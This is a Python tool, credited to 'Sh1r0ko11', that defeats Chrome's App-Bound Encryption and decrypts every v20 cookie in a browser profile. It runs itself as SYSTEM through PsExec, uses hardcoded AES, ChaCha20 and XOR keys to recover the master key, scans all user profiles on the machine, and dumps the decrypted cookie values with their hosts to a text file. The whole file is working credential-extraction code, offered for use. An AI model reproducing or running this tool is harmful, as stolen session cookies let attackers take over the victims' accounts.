"""
decrypt chrome v20 cookies with app bound protection
self calling exe version using file based communication
made by: Sh1r0ko11
license: MIT
COMPLETE REWROTE, to make it possible to execute the script as an .exe not only .py!
"""
import os
import io
import sys
import json
import shutil
import struct
import ctypes
import base64
import binascii
import sqlite3
import pathlib
import tempfile
import winreg
import subprocess
import time
import traceback
from Crypto.Cipher import AES, ChaCha20_Poly1305

#hardcoded keys for chrome v20 decryption
AES_KEY_V1 = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
CHACHA20_KEY_V2 = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
XOR_KEY_V3 = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

WORK_DIR = r"C:\Windows\Temp"


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


def find_chrome_user_data():
    user_profile = os.environ.get('USERPROFILE', '')
    if user_profile:
        candidate = os.path.join(user_profile, "AppData", "Local", "Google", "Chrome", "User Data")
        if os.path.exists(os.path.join(candidate, "Local State")):
            return candidate

    username = os.environ.get('USERNAME') or os.environ.get('USER')
    if username and username.lower() not in ('system', 'nt authority', 'administrator'):
        candidate = os.path.join("C:\\Users", username, "AppData", "Local", "Google", "Chrome", "User Data")
        if os.path.exists(os.path.join(candidate, "Local State")):
            return candidate

    users_dir = "C:\\Users"
    if os.path.exists(users_dir):
        for user in os.listdir(users_dir):
            if user in ('Public', 'Default', 'All Users', 'desktop.ini'):
                continue
            candidate = os.path.join(users_dir, user, "AppData", "Local", "Google", "Chrome", "User Data")
            if os.path.exists(os.path.join(candidate, "Local State")):
                return candidate

    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList")
        for i in range(winreg.QueryInfoKey(key)[0]):
            try:
                sid = winreg.EnumKey(key, i)
                subkey = winreg.OpenKey(key, sid)
                profile_path, _ = winreg.QueryValueEx(subkey, "ProfileImagePath")
                winreg.CloseKey(subkey)
                candidate = os.path.join(profile_path, "AppData", "Local", "Google", "Chrome", "User Data")
                if os.path.exists(os.path.join(candidate, "Local State")):
                    winreg.CloseKey(key)
                    return candidate
            except Exception:
                continue
        winreg.CloseKey(key)
    except Exception:
        pass

    return os.path.join(os.environ.get('USERPROFILE', 'C:\\'), "AppData", "Local", "Google", "Chrome", "User Data")


def find_psexec():
    if getattr(sys, 'frozen', False):
        base_dir = os.path.dirname(sys.executable)
    else:
        base_dir = os.path.dirname(os.path.abspath(__file__))
    
    for name in ("psexec.exe", "PsExec.exe", "PSEXEC.EXE"):
        path = os.path.join(base_dir, name)
        if os.path.exists(path):
            return path
    
    cwd = os.getcwd()
    for name in ("psexec.exe", "PsExec.exe", "PSEXEC.EXE"):
        path = os.path.join(cwd, name)
        if os.path.exists(path):
            return path
    
    return None


def dpapi_decrypt_system(data: bytes) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    crypt32 = ctypes.windll.crypt32
    if not crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        err = ctypes.get_last_error()
        raise ctypes.WinError(err)

    decrypted = ctypes.string_at(pDataOut.pbData, pDataOut.cbData)
    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
    return decrypted


def cng_decrypt_system(encrypted_key: bytes) -> bytes:
    ncrypt = ctypes.windll.ncrypt

    hProvider = ctypes.c_void_p(0)
    status = ncrypt.NCryptOpenStorageProvider(ctypes.byref(hProvider), 'Microsoft Software Key Storage Provider', 0)
    if status != 0:
        raise Exception(f"NCryptOpenStorageProvider failed: 0x{status:08x}")

    hKey = ctypes.c_void_p(0)
    status = ncrypt.NCryptOpenKey(hProvider, ctypes.byref(hKey), 'Google Chromekey1', 0, 0)
    if status != 0:
        ncrypt.NCryptFreeObject(hProvider)
        raise Exception(f"NCryptOpenKey failed: 0x{status:08x}")

    pcbResult = ctypes.c_ulong(0)
    input_buf = (ctypes.c_ubyte * len(encrypted_key)).from_buffer_copy(encrypted_key)
    status = ncrypt.NCryptDecrypt(hKey, input_buf, len(input_buf), None, None, 0, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        raise Exception(f"1st NCryptDecrypt failed: 0x{status:08x}")

    out_buf = (ctypes.c_ubyte * pcbResult.value)()
    status = ncrypt.NCryptDecrypt(hKey, input_buf, len(input_buf), None, out_buf, pcbResult.value, ctypes.byref(pcbResult), 0x40)
    if status != 0:
        ncrypt.NCryptFreeObject(hKey)
        ncrypt.NCryptFreeObject(hProvider)
        raise Exception(f"2nd NCryptDecrypt failed: 0x{status:08x}")

    ncrypt.NCryptFreeObject(hKey)
    ncrypt.NCryptFreeObject(hProvider)
    return bytes(out_buf[:pcbResult.value])


def run_self_as_system(mode: str, payload: bytes, out_path: str, timeout: int = 30) -> bytes:
    psexec = find_psexec()
    if not psexec:
        raise FileNotFoundError("psexec.exe not found!")

    exe_path = sys.executable
    
    payload_path = out_path + ".in"
    for p in [out_path, payload_path, out_path + ".err", out_path + ".log"]:
        if os.path.exists(p):
            try:
                os.remove(p)
            except Exception:
                pass

    with open(payload_path, "wb") as f:
        f.write(payload)

    cmd = [psexec, "-accepteula", "-s", "-nobanner", exe_path, mode, payload_path, out_path]

    print("starting system job via psexec...")
    print(f"  mode: {mode}")
    print(f"  payload: {payload_path} ({len(payload)} bytes)")

    log_path = out_path + ".log"
    with open(log_path, "w", encoding="utf-8") as log:
        try:
            result = subprocess.run(cmd, stdout=log, stderr=subprocess.STDOUT, timeout=timeout)
        except subprocess.TimeoutExpired:
            raise TimeoutError(f"psexec did not respond after {timeout}s")

    print(f"psexec exit code: {result.returncode}")

    #show log
    try:
        with open(log_path, "r", encoding="utf-8") as f:
            raw = f.read()
            lines = [l.strip() for l in raw.splitlines() if l.strip() 
                     and "Connecting" not in l 
                     and "Starting" not in l 
                     and "Copying" not in l 
                     and "PsExec v" not in l 
                     and "Copyright" not in l 
                     and "Sysinternals" not in l
                     and "exited on" not in l]
        if lines:
            print(f"psexec log: {lines[:5]}")
    except Exception:
        pass

    #check error file
    err_path = out_path + ".err"
    if os.path.exists(err_path):
        with open(err_path, "r", encoding="utf-8") as f:
            err = f.read()
        raise Exception(f"system job failed:\n{err}")

    #check output file
    if not os.path.exists(out_path):
        raise FileNotFoundError("system job did not create an output file")

    with open(out_path, "r", encoding="utf-8") as f:
        content = f.read().strip()

    if not content:
        raise ValueError("system job produced empty output")

    #cleanup
    for p in [out_path, payload_path, log_path, err_path]:
        try:
            if os.path.exists(p):
                os.remove(p)
        except Exception:
            pass

    return base64.b64decode(content)


def user_dpapi_decrypt(data: bytes) -> bytes:
    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    pDataIn = DATA_BLOB(len(data), ctypes.cast(data, ctypes.POINTER(ctypes.c_ubyte)))
    pDataOut = DATA_BLOB()

    crypt32 = ctypes.windll.crypt32
    if not crypt32.CryptUnprotectData(ctypes.byref(pDataIn), None, None, None, None, 0, ctypes.byref(pDataOut)):
        err = ctypes.get_last_error()
        raise ctypes.WinError(err)

    decrypted = ctypes.string_at(pDataOut.pbData, pDataOut.cbData)
    ctypes.windll.kernel32.LocalFree(pDataOut.pbData)
    return decrypted


def parse_key_blob(blob_data: bytes) -> dict:
    buffer = io.BytesIO(blob_data)
    parsed = {}

    header_len = struct.unpack('<I', buffer.read(4))[0]
    parsed['header'] = buffer.read(header_len)
    content_len = struct.unpack('<I', buffer.read(4))[0]

    if 8 + header_len + content_len != len(blob_data):
        raise ValueError(f"invalid blob: expected {8 + header_len + content_len} got {len(blob_data)}")

    parsed['flag'] = buffer.read(1)[0]

    if parsed['flag'] == 1 or parsed['flag'] == 2:
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    elif parsed['flag'] == 3:
        parsed['encrypted_aes_key'] = buffer.read(32)
        parsed['iv'] = buffer.read(12)
        parsed['ciphertext'] = buffer.read(32)
        parsed['tag'] = buffer.read(16)
    else:
        raise ValueError(f"unsupported flag: 0x{parsed['flag']:02x}")

    return parsed


def byte_xor(ba1: bytes, ba2: bytes) -> bytes:
    return bytes([_a ^ _b for _a, _b in zip(ba1, ba2)])


def derive_v20_master_key(parsed_data: dict) -> bytes:
    flag = parsed_data['flag']

    if flag == 1:
        print("flag 0x01 detected (aes 256 gcm chrome 127 132)")
        cipher = AES.new(AES_KEY_V1, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    elif flag == 2:
        print("flag 0x02 detected (chacha20 poly1305 chrome 133 136)")
        cipher = ChaCha20_Poly1305.new(key=CHACHA20_KEY_V2, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    elif flag == 3:
        print("flag 0x03 detected (aes 256 gcm plus cng chrome 137 and up)")
        print("decrypting aes key via cng as system...")
        out_path = os.path.join(WORK_DIR, "chrome_cng_out.b64")
        decrypted_aes_key = run_self_as_system("--system-cng", parsed_data['encrypted_aes_key'], out_path)
        if len(decrypted_aes_key) != 32:
            raise ValueError(f"cng decrypted key is {len(decrypted_aes_key)} bytes expected 32")
        xored_aes_key = byte_xor(decrypted_aes_key, XOR_KEY_V3)
        cipher = AES.new(xored_aes_key, AES.MODE_GCM, nonce=parsed_data['iv'])
        return cipher.decrypt_and_verify(parsed_data['ciphertext'], parsed_data['tag'])

    else:
        raise ValueError(f"unsupported flag: {flag}")


def decrypt_cookie_v20(master_key: bytes, encrypted_value: bytes) -> str:
    cookie_iv = encrypted_value[3:15]
    encrypted_cookie = encrypted_value[15:-16]
    cookie_tag = encrypted_value[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=cookie_iv)
    decrypted = cipher.decrypt_and_verify(encrypted_cookie, cookie_tag)
    return decrypted[32:].decode('utf-8', errors='ignore')


def main():
    #system mode called by psexec
    if len(sys.argv) > 3 and sys.argv[1] == "--system-dpapi":
        payload_path = sys.argv[2]
        out_path = sys.argv[3]
        try:
            with open(payload_path, "rb") as f:
                payload = f.read()
            result = dpapi_decrypt_system(payload)
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(base64.b64encode(result).decode())
        except Exception as e:
            err_msg = traceback.format_exc()
            with open(out_path + ".err", "w", encoding="utf-8") as f:
                f.write(err_msg)
            sys.exit(1)
        return

    if len(sys.argv) > 3 and sys.argv[1] == "--system-cng":
        payload_path = sys.argv[2]
        out_path = sys.argv[3]
        try:
            with open(payload_path, "rb") as f:
                payload = f.read()
            result = cng_decrypt_system(payload)
            with open(out_path, "w", encoding="utf-8") as f:
                f.write(base64.b64encode(result).decode())
        except Exception as e:
            err_msg = traceback.format_exc()
            with open(out_path + ".err", "w", encoding="utf-8") as f:
                f.write(err_msg)
            sys.exit(1)
        return

    #main program
    print("=" * 60)
    print("chrome v20 cookie decryptor exe version")
    print("=" * 60)

    if not is_admin():
        print("error: please run as administrator!")
        return

    psexec = find_psexec()
    if not psexec:
        print("error: psexec.exe was not found!")
        print("  download pstools: https://download.sysinternals.com/files/PSTools.zip")
        return

    print(f"psexec found: {psexec}")
    print(f"executable path: {sys.executable}")
    print(f"admin status: {is_admin()}")

    #no test run directly to real decryption
    #(test with b"test" wont work cause its not encrypted with system)

    chrome_data_path = find_chrome_user_data()
    local_state_path = os.path.join(chrome_data_path, "Local State")
    cookie_db_path = os.path.join(chrome_data_path, "Default", "Network", "Cookies")

    print(f"\nchrome user data directory: {chrome_data_path}")

    if not os.path.exists(local_state_path):
        raise FileNotFoundError(f"local state not found: {local_state_path}")

    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    app_bound_encrypted_key = local_state["os_crypt"]["app_bound_encrypted_key"]
    decoded_prefix = binascii.a2b_base64(app_bound_encrypted_key)[:4]
    if decoded_prefix != b"APPB":
        raise Exception(f"app_bound_encrypted_key does not start with APPB (got {decoded_prefix})")

    payload = binascii.a2b_base64(app_bound_encrypted_key)[4:]
    print(f"payload length: {len(payload)} bytes")

    #system dpapi
    print("starting system dpapi decryption...")
    out_path = os.path.join(WORK_DIR, "chrome_dpapi_out.b64")
    try:
        system_dec = run_self_as_system("--system-dpapi", payload, out_path)
        print(f"system dpapi successful ({len(system_dec)} bytes)")
    except Exception as e:
        print(f"system dpapi failed: {e}")
        print("  this can happen if:")
        print("  the key was not encrypted with system (chrome older than 127)")
        print("  psexec is not working correctly")
        return

    #user dpapi
    print("starting user dpapi decryption...")
    try:
        user_dec = user_dpapi_decrypt(system_dec)
        print(f"user dpapi done ({len(user_dec)} bytes)")
    except Exception as e:
        print(f"user dpapi failed: {e}")
        return

    #parse
    print("parsing key blob...")
    try:
        parsed_data = parse_key_blob(user_dec)
        print(f"detected flag: 0x{parsed_data['flag']:02x}")
    except Exception as e:
        print(f"parse failed: {e}")
        return

    #master key
    try:
        decrypted_key = derive_v20_master_key(parsed_data)
        print(f"master key extracted ({len(decrypted_key)} bytes)")
    except Exception as e:
        print(f"master key decryption failed: {e}")
        return

    #cookies
    cookie_list = []
    with tempfile.TemporaryDirectory() as temp_dir:
        temp_db_path = os.path.join(temp_dir, "Cookies_temp")
        try:
            shutil.copy2(cookie_db_path, temp_db_path)
        except PermissionError:
            print("could not copy cookie db trying direct access...")
            temp_db_path = cookie_db_path

        con = sqlite3.connect(pathlib.Path(temp_db_path).as_uri() + "?mode=ro", uri=True)
        cur = con.cursor()
        cur.execute("SELECT host_key, name, CAST(encrypted_value AS BLOB) FROM cookies;")
        rows = cur.fetchall()
        con.close()

        for host, name, enc_val in rows:
            if not enc_val or enc_val[:3] != b"v20":
                continue
            try:
                cookie_value = decrypt_cookie_v20(decrypted_key, enc_val)
                cookie_obj = {"host": host, "name": name, "value": cookie_value}
                cookie_list.append(cookie_obj)
                print(f"  cookie found: {host} | {name}")
            except Exception as e:
                print(f"  error at {host} {name}: {e}")

    #save
    if cookie_list:
        if getattr(sys, 'frozen', False):
            out_dir = os.path.dirname(sys.executable)
        else:
            out_dir = os.path.dirname(os.path.abspath(__file__))
        output_path = os.path.join(out_dir, "chrome_cookies.txt")
        with open(output_path, "w", encoding="utf-8") as f:
            json.dump(cookie_list, f, indent=2, ensure_ascii=False)
        print(f"\n{len(cookie_list)} cookies saved to {output_path}")
    else:
        print("\nno v20 cookies found.")


if __name__ == "__main__":
    main()
